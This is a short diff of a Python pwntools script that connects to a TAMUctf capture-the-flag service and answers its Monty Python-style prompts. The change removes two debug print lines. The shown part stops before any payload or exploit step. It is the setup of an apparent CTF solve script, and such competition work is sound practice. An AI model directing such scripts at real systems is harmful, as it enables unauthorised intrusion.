@@ -4,10 +4,8 @@ from pwn import *
 p=remote("pwn.tamuctf.com",4321)
 
 p.recvuntil('What... is your name?')
-print '1'
 p.sendline('Sir Lancelot of Camelot')
 p.recvuntil('What... is your quest?')
-print '2'
 p.sendline('To seek the Holy Grail.')
 
 p.recvuntil('What... is my secret?')
